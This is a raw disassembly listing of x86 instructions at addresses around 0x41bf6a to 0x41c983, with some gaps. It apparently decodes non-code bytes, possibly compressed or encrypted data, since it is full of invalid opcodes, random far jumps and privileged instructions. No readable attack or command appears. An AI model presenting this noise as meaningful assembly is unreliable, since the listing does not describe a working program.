  41bf6a:	xor    BYTE PTR [esp+eax*4+0x473e0171],ch
  41bf71:	sbb    dl,BYTE PTR [eax-0x3d5bbf5a]
  41bf77:	xor    DWORD PTR [ebx],esi
  41bf79:	add    al,0x44
  41bf7b:	addr16 int 0x49
  41bf7e:	and    cl,BYTE PTR [edi+0x9]
  41bf81:	dec    eax
  41bf82:	xchg   esi,eax
  41bf83:	sub    eax,0xbed7f7bb
  41bf88:	mov    dh,0x20
  41bf8a:	fimul  WORD PTR [edx]
  41bf8c:	data16 fnstsw WORD PTR [ebp+0x28]
	...
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	leave  
  41c001:	rcr    BYTE PTR [edx],1
  41c003:	dec    esi
  41c004:	xor    al,0x29
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	jmp    0x41c002
  41c00e:	jo     0x41bfc1
  41c010:	mov    cl,0x66
  41c012:	int3   
  41c013:	clc    
  41c014:	cmp    BYTE PTR [esi+0x126e7c59],al
  41c01a:	arpl   WORD PTR [esi-0x3a],cx
  41c01d:	fnstsw WORD PTR [edx+0x49499e3a]
  41c023:	arpl   sp,bx
  41c025:	or     DWORD PTR [edi+0x4],ebx
  41c028:	ins    BYTE PTR es:[edi],dx
  41c029:	add    al,0x43
  41c02b:	(bad)  
  41c02d:	cmp    DWORD PTR [ebx+0x4fc2fd57],esi
  41c033:	adc    DWORD PTR [ebp+eax*2-0x6a],eax
  41c037:	pushf  
  41c038:	repz push esi
  41c03a:	shl    BYTE PTR [edx-0x827120],1
  41c040:	mov    dh,0xb8
  41c042:	mov    WORD PTR [ebp+0x53],es
  41c045:	cmc    
  41c046:	cmp    esp,DWORD PTR [edx+0x39]
  41c049:	or     BYTE PTR [ebx-0x28],dl
  41c04c:	jae    0x41c094
  41c04e:	pusha  
  41c04f:	add    eax,0xc6027ba7
  41c054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c056:	cmp    ebp,ecx
  41c058:	lods   eax,DWORD PTR ds:[esi]
  41c059:	retf   0x58ef
  41c05c:	add    DWORD PTR [edx],esi
  41c05e:	sub    DWORD PTR [ecx+0x5c],esi
  41c061:	mov    eax,ds:0xb35c02ae
  41c066:	mov    ah,0xab
  41c068:	xor    ch,al
  41c06a:	xchg   ebx,eax
  41c06b:	add    edi,edi
  41c06d:	test   BYTE PTR [ebp-0x70],dl
  41c070:	imul   esp,DWORD PTR [ecx+edx*4-0x513fa26e],0xe4694465
  41c07b:	iret   
  41c07c:	push   ebx
  41c07d:	fimul  DWORD PTR [ebx+0x58]
  41c080:	pop    ds
  41c081:	sub    BYTE PTR [ebx],ah
  41c083:	arpl   dx,bx
  41c085:	retf   
  41c086:	ficom  WORD PTR [eax]
  41c088:	push   edi
  41c089:	out    dx,eax
  41c08a:	jge    0x41c05b
  41c08c:	aas    
  41c08d:	mov    ah,dl
  41c08f:	push   edx
  41c090:	mov    ebx,0x880ed0a
  41c095:	pusha  
  41c096:	push   edi
  41c097:	popa   
  41c098:	mov    ss,WORD PTR [edi-0x14]
  41c09b:	pop    ds
  41c09c:	enter  0xb9fe,0x1b
  41c0a0:	ret    0xaf7f
  41c0a3:	pop    es
  41c0a4:	sub    al,dh
  41c0a6:	call   DWORD PTR es:[ebx+ecx*1-0x6]
  41c0ab:	mov    dl,0xee
  41c0ad:	xlat   BYTE PTR ds:[ebx]
  41c0ae:	not    BYTE PTR [esi-0x1b5d2f1c]
  41c0b4:	rcl    BYTE PTR [edi+0x4c6275a5],0x8b
  41c0bb:	mov    dh,0xcb
  41c0bd:	retf   0x909c
  41c0c0:	lea    ebx,[edx]
  41c0c2:	mov    di,0x2fb9
  41c0c6:	mov    ecx,0x5b4a178e
  41c0cb:	and    cl,dh
  41c0cd:	or     dh,ch
  41c0cf:	pusha  
  41c0d0:	inc    esi
  41c0d1:	fnstsw ax
  41c0d3:	fcmovne st,st(4)
  41c0d5:	je     0x41c08a
  41c0d7:	(bad)  
  41c0d9:	(bad)  
  41c0da:	arpl   WORD PTR [edi+0x46],cx
  41c0dd:	adc    eax,0x48227edb
  41c0e2:	and    BYTE PTR [eax],dh
  41c0e4:	loopne 0x41c14e
  41c0e6:	rcr    DWORD PTR [edx-0x5a],0x6b
  41c0ea:	sub    dh,bl
  41c0ec:	je     0x41c11c
  41c0ee:	mov    ch,0x1
  41c0f0:	inc    ebx
  41c0f1:	in     al,0xb6
  41c0f3:	and    al,bl
  41c0f5:	xlat   BYTE PTR ds:[ebx]
  41c0f6:	xor    eax,0x1df8cd2a
  41c0fb:	xlat   BYTE PTR ds:[ebx]
  41c0fc:	retf   0xecdf
  41c0ff:	sahf   
  41c100:	dec    esi
  41c101:	(bad)  
  41c102:	jl     0x41c121
  41c104:	cmp    edi,ecx
  41c106:	xlat   BYTE PTR ds:[ebx]
  41c107:	call   0xdb50:0xfe770dd8
  41c10e:	inc    esp
  41c10f:	push   edi
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0xb8a692e9,eax
  41c183:	hlt    
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	and    BYTE PTR [ecx],cl
  41c18e:	iret   
  41c18f:	sti    
  41c190:	mov    esi,0x3d384dc3
  41c195:	or     ebp,DWORD PTR ds:[esi-0x5f]
  41c199:	adc    eax,0x9d652bab
  41c19e:	bound  ebx,QWORD PTR [ebp-0x2a]
  41c1a1:	dec    eax
  41c1a2:	add    DWORD PTR cs:[edx-0x53405eb5],ecx
  41c1a9:	lds    esi,FWORD PTR [esi+0x3a70d59f]
  41c1af:	aam    0x9f
  41c1b1:	xbegin 0x814287f5
  41c1b7:	addr16 cli 
  41c1b9:	jp     0x41c1a2
  41c1bb:	xchg   ebp,eax
  41c1bc:	sbb    DWORD PTR ds:[esi],0x23
  41c1c0:	cli    
  41c1c1:	push   ss
  41c1c2:	and    cl,bl
  41c1c4:	imul   ebp,DWORD PTR [eax],0xea05944b
  41c1ca:	dec    eax
  41c1cb:	dec    edx
  41c1cc:	outs   dx,BYTE PTR ds:[esi]
  41c1cd:	pop    ds
  41c1ce:	mov    dh,BYTE PTR [ecx+0x4279fc36]
  41c1d4:	loop   0x41c24d
  41c1d6:	ret    
  41c1d7:	push   esi
  41c1d8:	push   ebp
  41c1d9:	dec    ebp
  41c1da:	retf   
  41c1db:	int3   
  41c1dc:	bound  ebx,QWORD PTR [esi-0x4f]
  41c1df:	fcom   QWORD PTR [ecx]
  41c1e1:	mov    esi,ecx
  41c1e3:	fs les edi,FWORD PTR ss:[esi+0x20]
  41c1e8:	sub    BYTE PTR [eax+0x11b23b61],0x27
  41c1ef:	out    dx,al
  41c1f0:	cwde   
  41c1f1:	inc    esi
  41c1f2:	push   es
  41c1f3:	xchg   esp,eax
  41c1f4:	addr16 or eax,0xa284ef9e
  41c1fa:	mov    esp,0x9c96b72d
  41c1ff:	add    eax,DWORD PTR [ebx+0x68]
  41c202:	mov    eax,0x521453e8
  41c207:	lods   al,BYTE PTR ds:[esi]
  41c208:	xchg   edx,eax
  41c209:	jp     0x41c1ab
  41c20b:	and    eax,0xde642822
  41c210:	jne    0x41c284
  41c212:	retf   0x5b38
  41c215:	xor    BYTE PTR [ebp+0x7c91c3b5],ah
  41c21b:	int    0x76
  41c21d:	aad    0xa5
  41c21f:	jae    0x41c224
  41c221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c222:	mov    ds:0xaed97a7e,al
  41c228:	adc    ah,bh
  41c22a:	inc    eax
  41c22b:	dec    esi
  41c22c:	mov    esp,0xf392f5bf
  41c231:	xchg   esi,eax
  41c232:	cmp    eax,0x62ef4757
  41c237:	ins    BYTE PTR es:[edi],dx
  41c238:	sbb    eax,0x73841f8e
  41c23d:	xor    eax,0xa3fa204b
  41c242:	and    DWORD PTR [esi+0x4e],0xb8090676
  41c249:	or     DWORD PTR [ebp-0xa],0x87138f2f
  41c250:	cmp    BYTE PTR [eax+0x57],0x43
  41c254:	test   BYTE PTR [edx+0x7c],bl
  41c257:	push   0xffffffd2
  41c259:	in     eax,dx
  41c25a:	out    0x69,eax
  41c25c:	aas    
  41c25d:	or     BYTE PTR [edi],bl
  41c25f:	jmp    0x41c28a
  41c261:	xchg   BYTE PTR [edi],dl
  41c263:	mov    ebx,0xd3540b8d
  41c268:	jns    0x41c270
  41c26a:	out    0x7a,al
  41c26c:	gs inc esi
  41c26e:	(bad)  
  41c26f:	xchg   esp,eax
  41c270:	jp     0x41c207
  41c272:	and    ecx,DWORD PTR [ecx]
  41c274:	pusha  
  41c275:	pmaddwd mm5,QWORD PTR [edx+eiz*2-0x65]
  41c27a:	xor    ch,bl
  41c27c:	dec    edx
  41c27d:	and    DWORD PTR ds:0xc7e1e10a,0xfffffffa
  41c284:	(bad)  
  41c285:	leave  
  41c286:	mov    ah,0xf5
  41c288:	outs   dx,BYTE PTR ds:[esi]
  41c289:	xor    eax,0xbea6eff5
  41c28e:	call   0x41c334
	...
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	leave  
  41c301:	fadd   DWORD PTR [ebx+eax*2+0x3c]
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR [ecx+eax*1],al
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	outs   dx,BYTE PTR ds:[esi]
  41c30d:	mov    ebp,0x93369b31
  41c312:	arpl   WORD PTR [edx-0x5e],sp
  41c315:	cmp    eax,0x5fa7e2ec
  41c31a:	ins    DWORD PTR es:[edi],dx
  41c31b:	push   ebp
  41c31c:	inc    eax
  41c31d:	dec    eax
  41c31e:	loop   0x41c2a4
  41c320:	sbb    cl,ch
  41c322:	in     eax,0x2
  41c324:	addr16 mov esp,0x295b622f
  41c32a:	inc    eax
  41c32b:	shl    DWORD PTR [eax+0x6d],cl
  41c32e:	mov    eax,ds:0xab0e0b74
  41c333:	xor    esi,DWORD PTR [eax+0x30ddd41e]
  41c339:	sbb    dl,BYTE PTR [esi+0x65]
  41c33c:	mov    DWORD PTR [edx+0xe],edi
  41c33f:	addr16 loop 0x41c38e
  41c342:	pop    ss
  41c343:	clc    
  41c344:	loop   0x41c321
  41c346:	push   ebp
  41c347:	sahf   
  41c348:	adc    ebp,ebx
  41c34a:	xor    dh,BYTE PTR [ecx+ecx*4-0x79]
  41c34e:	push   edi
  41c34f:	push   edi
  41c350:	xchg   esp,eax
  41c351:	inc    eax
  41c352:	repz xor BYTE PTR [esi-0x74363167],dl
  41c359:	repz sub eax,0xed9a374f
  41c35f:	jbe    0x41c3ad
  41c361:	iret   
  41c362:	daa    
  41c363:	mov    edi,0x640bdb30
  41c368:	mov    ecx,0x3b6074dc
  41c36d:	xchg   esi,eax
  41c36e:	sub    al,0xfa
  41c370:	xor    al,0xe8
  41c372:	dec    ebp
  41c373:	adc    BYTE PTR [ebp+0x5b],dl
  41c376:	mov    bl,0x43
  41c378:	or     dh,BYTE PTR [esi-0x1a3c05a9]
  41c37e:	fsubr  QWORD PTR [ebp-0x6d]
  41c381:	(bad)  
  41c383:	lea    edi,[ebx+0x77]
  41c386:	hlt    
  41c387:	pop    edx
  41c388:	hlt    
  41c389:	mov    esi,DWORD PTR [ebp-0x6261067f]
  41c38f:	cli    
  41c390:	into   
  41c391:	cdq    
  41c392:	cwde   
  41c393:	xor    dh,BYTE PTR [esi+0x2c5f7397]
  41c399:	mov    ebx,0x75bbe0d0
  41c39e:	inc    ebp
  41c39f:	pop    edi
  41c3a0:	xlat   BYTE PTR ds:[ebx]
  41c3a1:	fs jle 0x41c34e
  41c3a4:	hlt    
  41c3a5:	jnp    0x41c3a4
  41c3a7:	sub    eax,ebp
  41c3a9:	and    BYTE PTR [edx-0x1ee992e8],dh
  41c3af:	repz ss pop esp
  41c3b2:	push   edi
  41c3b3:	mov    esi,0x2829b234
  41c3b8:	dec    eax
  41c3b9:	and    ebx,DWORD PTR [edx-0x593d3117]
  41c3bf:	imul   ebp,DWORD PTR [ecx-0x17],0xffffffb3
  41c3c3:	addr16 call 0xc2db:0xa25e2485
  41c3cb:	sub    al,0x2c
  41c3cd:	dec    ecx
  41c3ce:	arpl   si,cx
  41c3d0:	mov    eax,0xf178bfc4
  41c3d5:	repnz shl BYTE PTR [ecx],1
  41c3d8:	lock adc eax,0x651fcd55
  41c3de:	sar    DWORD PTR [eax+0x41d645b],cl
  41c3e4:	je     0x41c464
  41c3e6:	aam    0x61
  41c3e8:	dec    esp
  41c3e9:	xchg   ebp,eax
  41c3ea:	fldcw  WORD PTR ds:0x4abf8eb1
  41c3f0:	test   edi,0x9391e8ac
  41c3f6:	gs mov dl,bh
  41c3f9:	aaa    
  41c3fa:	xor    al,0x95
  41c3fc:	pop    ebx
  41c3fd:	inc    esp
  41c3fe:	push   0x394acaa
  41c403:	push   0x384e68bb
  41c408:	mov    ecx,DWORD PTR [ebp+0x6a]
  41c40b:	xchg   BYTE PTR [ebx+0x21],ch
  41c40e:	pushf  
  41c40f:	mov    eax,DWORD PTR [eax]
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	mov    bh,BYTE PTR [eax+0x2c401139]
  41c486:	add    DWORD PTR [eax],eax
  41c488:	add    al,0x1
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	cmp    al,0xf1
  41c48e:	sbb    al,BYTE PTR [edx-0x11]
  41c491:	dec    edx
  41c492:	or     BYTE PTR ds:0x9947af31,ch
  41c498:	test   al,0xdc
  41c49a:	call   0xc0fecccf
  41c49f:	fmul   DWORD PTR [edi-0xd]
  41c4a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4a3:	pop    ds
  41c4a4:	in     al,dx
  41c4a5:	or     al,bh
  41c4a7:	or     bl,cl
  41c4a9:	aad    0x53
  41c4ab:	loope  0x41c4cd
  41c4ad:	std    
  41c4ae:	sub    al,0x74
  41c4b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b1:	loopne 0x41c467
  41c4b3:	mov    edx,0xbba049ab
  41c4b8:	sar    DWORD PTR [ecx-0x1138fb36],0xd1
  41c4bf:	mov    eax,0x4bac4e
  41c4c4:	ds sti 
  41c4c6:	sbb    al,0x95
  41c4c8:	enter  0x322c,0x7a
  41c4cc:	or     al,0x59
  41c4ce:	cmp    BYTE PTR [eax+0x2b49a9d0],bl
  41c4d4:	or     edx,DWORD PTR [ebx+0x21]
  41c4d7:	(bad)  
  41c4d9:	push   ss
  41c4da:	jge    0x41c4cb
  41c4dc:	cmc    
  41c4dd:	mov    dh,0x1
  41c4df:	add    BYTE PTR [ebx-0x77],cl
  41c4e2:	(bad)  
  41c4e3:	xchg   ebx,eax
  41c4e4:	lea    ebp,[ebp-0x7dc8010a]
  41c4ea:	lods   al,BYTE PTR ds:[esi]
  41c4eb:	retf   
  41c4ec:	enter  0x512,0x2
  41c4f0:	rol    DWORD PTR [esi],cl
  41c4f2:	ins    BYTE PTR es:[edi],dx
  41c4f3:	jns    0x41c493
  41c4f5:	jle    0x41c486
  41c4f7:	stc    
  41c4f8:	das    
  41c4f9:	outs   dx,DWORD PTR ds:[esi]
  41c4fa:	mov    dl,0x24
  41c4fc:	adc    DWORD PTR [eax-0x21],eax
  41c4ff:	adc    BYTE PTR [edi-0x7b],al
  41c502:	std    
  41c503:	lea    esp,[edx-0x31]
  41c506:	sbb    DWORD PTR [edx+edx*8],ecx
  41c509:	push   0x60c7821c
  41c50e:	or     BYTE PTR [esp+eiz*8],0xf1
  41c512:	enter  0x2167,0xe5
  41c516:	jne    0x41c50d
  41c518:	loope  0x41c4e0
  41c51a:	cmp    DWORD PTR [edi+0x64],esp
  41c51d:	sub    dh,BYTE PTR [ebx+0x47b358a9]
  41c523:	adc    edx,DWORD PTR [ecx+edx*8]
  41c526:	sar    DWORD PTR [ebp+0x2b6053c1],cl
  41c52c:	test   eax,0x41f133bb
  41c531:	adc    DWORD PTR [edx-0xc],ecx
  41c534:	push   es
  41c535:	mov    eax,0xcbaadcc1
  41c53a:	(bad)  [eax]
  41c53c:	imul   esi,DWORD PTR [eax],0x64
  41c53f:	add    ecx,DWORD PTR [ecx-0x6eed7356]
  41c545:	xchg   DWORD PTR [edi+0x37],eax
  41c548:	daa    
  41c549:	(bad)
  41c54c:	call   0xd17884ac
  41c551:	popf   
  41c552:	dec    eax
  41c553:	cmp    ch,BYTE PTR ds:0x5cb2140a
  41c559:	ds fmulp st(1),st
  41c55c:	or     cl,al
  41c55e:	punpckhdq mm3,QWORD PTR [ebx+0x3db368be]
  41c565:	or     BYTE PTR [eax+ecx*1+0x3bef32b3],bh
  41c56c:	pop    ebp
  41c56d:	rcr    BYTE PTR [ebx+0x67b8ee4d],0x68
  41c574:	jb     0x41c556
  41c576:	jb     0x41c5ed
  41c578:	cmp    eax,DWORD PTR [eax-0x1f]
  41c57b:	and    al,0xe0
  41c57d:	inc    ebx
  41c57e:	jmp    0x289c:0x69a1b45c
  41c585:	(bad)  
  41c586:	cmp    al,0x90
  41c588:	(bad)  
  41c58a:	out    dx,al
  41c58b:	(bad)  
  41c58d:	cli    
  41c58e:	cmp    BYTE PTR [ebx+0x0],dh
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0xcfcad2bb
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	test   DWORD PTR [edi],esp
  41c60e:	sbb    BYTE PTR [edx-0x6e],bl
  41c611:	sbb    dl,BYTE PTR [edi+0x2a]
  41c614:	cmp    ah,BYTE PTR [eax+0x7b9eac2d]
  41c61a:	push   eax
  41c61b:	repz pop edx
  41c61d:	jp     0x41c665
  41c61f:	into   
  41c620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c621:	ins    DWORD PTR es:[edi],dx
  41c622:	pusha  
  41c623:	sar    DWORD PTR [eax+0x49],0xd1
  41c627:	pop    esi
  41c628:	fwait
  41c629:	je     0x41c5ba
  41c62b:	pop    ss
  41c62c:	dec    edx
  41c62d:	cmp    ebp,edx
  41c62f:	sbb    al,BYTE PTR [edi-0x32d8b4a7]
  41c635:	inc    edi
  41c636:	fwait
  41c637:	ret    
  41c638:	imul   ecx,DWORD PTR [eax+0x63],0x217273b5
  41c63f:	out    0xd7,eax
  41c641:	push   ebx
  41c642:	imul   esi,DWORD PTR [ecx+0x63],0xc8707cb4
  41c649:	outs   dx,DWORD PTR ds:[esi]
  41c64a:	inc    eax
  41c64b:	mov    DWORD PTR [ebx-0x3d],esi
  41c64e:	test   eax,0x6e41b799
  41c653:	pop    eax
  41c654:	aaa    
  41c655:	mov    al,ds:0xec5e5e55
  41c65a:	in     eax,dx
  41c65b:	jmp    FWORD PTR [edx-0x8]
  41c65e:	jae    0x41c63d
  41c660:	data16 ss js 0x41c6a6
  41c664:	mov    ebx,0x11876309
  41c669:	jge    0x41c6e6
  41c66b:	mov    bl,dl
  41c66d:	add    cl,BYTE PTR [edx]
  41c66f:	xchg   ecx,eax
  41c670:	inc    edi
  41c671:	mov    al,ds:0xabd23f05
  41c676:	inc    ecx
  41c677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c678:	scas   al,BYTE PTR es:[edi]
  41c679:	sbb    cl,dl
  41c67b:	cmp    ch,BYTE PTR [ecx]
  41c67d:	push   ebx
  41c67e:	jns    0x41c64e
  41c680:	dec    esp
  41c681:	push   ss
  41c682:	mov    ch,BYTE PTR [edi-0x625023e]
  41c688:	pop    ss
  41c689:	stos   DWORD PTR es:[edi],eax
  41c68a:	in     eax,0x7
  41c68c:	popa   
  41c68d:	out    0xb7,eax
  41c68f:	sbb    BYTE PTR [edi-0x44],dh
  41c692:	push   es
  41c693:	jo     0x41c676
  41c695:	dec    edx
  41c696:	mov    dl,0x75
  41c698:	es out dx,eax
  41c69a:	pushf  
  41c69b:	sbb    al,0x7
  41c69d:	ret    0x1a07
  41c6a0:	add    BYTE PTR [edi-0x80],cl
  41c6a3:	and    eax,0xfabc63cf
  41c6a8:	cmp    esi,DWORD PTR [esi]
  41c6aa:	xchg   edx,eax
  41c6ab:	jp     0x41c6d6
  41c6ad:	push   edx
  41c6ae:	popa   
  41c6af:	xor    esp,DWORD PTR [ecx+0x1a]
  41c6b2:	inc    ebp
  41c6b3:	dec    ebx
  41c6b4:	pusha  
  41c6b5:	jmp    0x41c6e2
  41c6b7:	xor    cl,dh
  41c6b9:	daa    
  41c6ba:	mov    al,ds:0x8bd512e2
  41c6bf:	push   ds
  41c6c0:	lahf   
  41c6c1:	out    dx,al
  41c6c2:	dec    ebp
  41c6c3:	loop   0x41c6db
  41c6c5:	loopne 0x41c65b
  41c6c7:	sub    BYTE PTR [edx+eax*4-0x1c],0x90
  41c6cc:	(bad)  
  41c6cd:	and    bh,BYTE PTR [ebp-0x1b91c4a4]
  41c6d3:	and    al,BYTE PTR [ecx]
  41c6d5:	ins    BYTE PTR es:[edi],dx
  41c6d6:	sbb    ch,BYTE PTR [ebp+0x29]
  41c6d9:	fsubr  st(1),st
  41c6db:	and    al,0x5e
  41c6dd:	int3   
  41c6de:	lods   al,BYTE PTR ds:[esi]
  41c6df:	gs push 0x1c
  41c6e2:	ja     0x41c717
  41c6e4:	mov    ah,0xe5
  41c6e6:	adc    al,0xc0
  41c6e8:	adc    BYTE PTR [ecx],dl
  41c6ea:	aaa    
  41c6eb:	lock cdq 
  41c6ed:	sub    eax,0xf158c15e
  41c6f2:	rcr    DWORD PTR [edi],0xec
  41c6f5:	jmp    0x41c695
  41c6f7:	add    eax,0xfed6b3cc
  41c6fc:	adc    eax,0xb7bcff7a
  41c701:	adc    eax,0x96c651d
  41c706:	(bad)  ds:0x7e0fa7c0
  41c70c:	mov    ebx,0xb5fd52
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c782:	xor    al,0xfe
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	sti    
  41c78d:	and    eax,0xf741588a
  41c792:	lea    ebx,[ebp-0x2b]
  41c795:	loop   0x41c7a9
  41c797:	push   ecx
  41c798:	arpl   WORD PTR [esi+0x735d1e85],cx
  41c79e:	xor    DWORD PTR [edx-0x42222945],esi
  41c7a4:	jne    0x41c7b6
  41c7a6:	fwait
  41c7a7:	or     eax,0xe360452a
  41c7ac:	arpl   WORD PTR [ecx],ax
  41c7ae:	nop
  41c7af:	out    dx,eax
  41c7b0:	(bad)  
  41c7b1:	out    dx,eax
  41c7b2:	ds iret 
  41c7b4:	iret   
  41c7b5:	outs   dx,DWORD PTR ds:[esi]
  41c7b6:	mov    esi,0xc001438c
  41c7bb:	sbb    al,0x97
  41c7bd:	or     esi,esp
  41c7bf:	(bad)  
  41c7c0:	faddp  st(7),st
  41c7c2:	xchg   edx,eax
  41c7c3:	shl    DWORD PTR [ecx+0x2642a4a3],0xb6
  41c7ca:	(bad)  
  41c7cb:	sub    ebp,ebx
  41c7cd:	push   ds
  41c7ce:	pop    eax
  41c7cf:	cmp    al,BYTE PTR [ecx]
  41c7d1:	mov    ecx,0x77bd571
  41c7d6:	xchg   esi,eax
  41c7d7:	or     edi,edi
  41c7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7da:	into   
  41c7db:	pop    edi
  41c7dc:	mov    edx,0x725933fb
  41c7e1:	jp     0x41c85e
  41c7e3:	xchg   edi,eax
  41c7e4:	mov    ebp,0x2956fa41
  41c7e9:	add    al,0xee
  41c7eb:	or     eax,0x557d283e
  41c7f0:	mov    esi,0xf733f66
  41c7f5:	jo     0x41c82e
  41c7f7:	popa   
  41c7f8:	outs   dx,BYTE PTR ds:[esi]
  41c7f9:	jo     0x41c869
  41c7fb:	jmp    0x1589:0xeab0b335
  41c802:	push   es
  41c803:	jecxz  0x41c856
  41c805:	xchg   esp,eax
  41c806:	or     al,0x98
  41c808:	push   ebp
  41c809:	adc    eax,0x1d2d7589
  41c80e:	jl     0x41c852
  41c810:	addr16 push 0x9d858724
  41c816:	add    BYTE PTR [eax+eiz*2],ch
  41c819:	xchg   ebp,eax
  41c81a:	cld    
  41c81b:	cwde   
  41c81c:	adc    ebx,edi
  41c81e:	pop    edi
  41c81f:	ins    BYTE PTR es:[edi],dx
  41c820:	pushf  
  41c821:	dec    ebx
  41c822:	mov    ah,0x4
  41c824:	shr    BYTE PTR [edi],cl
  41c826:	add    ebx,ecx
  41c828:	xlat   BYTE PTR ds:[ebx]
  41c829:	push   esi
  41c82a:	push   0xeb1ca8de
  41c82f:	inc    ebp
  41c830:	shl    ebx,0xe1
  41c833:	mov    eax,ds:0x225c6327
  41c838:	fwait
  41c839:	sub    al,0x86
  41c83b:	push   es
  41c83c:	cli    
  41c83d:	in     eax,0x0
  41c83f:	dec    eax
  41c840:	sub    eax,0x3bdb9526
  41c845:	fmul   DWORD PTR [ecx+ecx*8+0x4e]
  41c849:	xchg   ecx,eax
  41c84a:	jnp    0x41c87b
  41c84c:	aas    
  41c84d:	inc    ebp
  41c84e:	xchg   esp,eax
  41c84f:	mov    DWORD PTR [edi],esp
  41c851:	rcl    BYTE PTR [esi-0x26bc6d07],0x48
  41c858:	xchg   ebp,eax
  41c859:	add    al,0xdc
  41c85b:	retf   0x1f8d
  41c85e:	aam    0x9
  41c860:	cmp    ebx,ecx
  41c862:	sbb    ebx,0x3f
  41c865:	push   edi
  41c866:	adc    esp,DWORD PTR [ecx+0x6ffe7bce]
  41c86c:	mov    cl,BYTE PTR [esi-0x64242b1]
  41c872:	sub    BYTE PTR [ebx+0x4d],0x33
  41c876:	mov    ds,ebp
  41c878:	inc    eax
  41c879:	push   eax
  41c87a:	stos   BYTE PTR es:[edi],al
  41c87b:	push   DWORD PTR [eax+0x5815b8b7]
  41c881:	jg     0x41c821
  41c883:	inc    eax
  41c884:	leave  
  41c885:	rcl    ch,1
  41c887:	push   ds
  41c888:	fcmove st,st(3)
  41c88a:	add    BYTE PTR [edx+0x6c31294],al
	...
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [edi+0x44],edx
  41c902:	cli    
  41c903:	mov    dh,0x4c
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	loop   0x41c98c
  41c90e:	mov    cl,0xbb
  41c910:	pop    edi
  41c911:	pop    es
  41c912:	fnsave [ebp+eiz*1+0xe]
  41c916:	daa    
  41c917:	mov    dh,0xdc
  41c919:	sbb    al,0x63
  41c91b:	ret    
  41c91c:	pop    ss
  41c91d:	out    0x1e,eax
  41c91f:	adc    dh,ch
  41c921:	into   
  41c922:	ja     0x41c94b
  41c924:	mov    bh,bl
  41c926:	mov    esp,0xe4e8a983
  41c92b:	inc    ebx
  41c92c:	test   al,0xda
  41c92e:	push   eax
  41c92f:	xchg   edi,eax
  41c930:	and    BYTE PTR [ebx],ch
  41c932:	pop    edx
  41c933:	jmp    0xa04b:0xdbbc5261
  41c93a:	dec    esi
  41c93b:	div    BYTE PTR ds:0xb2c7d474
  41c941:	ret    
  41c942:	daa    
  41c943:	js     0x41c8c6
  41c945:	in     eax,0xa3
  41c947:	sub    ecx,esi
  41c949:	adc    al,0x39
  41c94b:	xor    esi,DWORD PTR [edi]
  41c94d:	test   al,0x1f
  41c94f:	aad    0x35
  41c951:	out    0x4d,al
  41c953:	add    DWORD PTR [esi+0x7a],esp
  41c956:	xchg   esp,eax
  41c957:	stos   DWORD PTR es:[edi],eax
  41c958:	hlt    
  41c959:	bound  dx,DWORD PTR [esi]
  41c95c:	rcl    BYTE PTR [ebx-0x35],0xce
  41c960:	daa    
  41c961:	ins    BYTE PTR es:[edi],dx
  41c962:	js     0x41c928
  41c964:	fwait
  41c965:	test   eax,0xc3a5536
  41c96a:	sub    edx,DWORD PTR ds:0xee2f513b
  41c970:	sub    BYTE PTR [eax-0x3c],al
  41c973:	push   eax
  41c974:	(bad)
  41c978:	push   ss
  41c979:	jmp    0x89d0:0x7e8167f1
  41c980:	ror    DWORD PTR [ecx],0xce
  41c983:	popa   
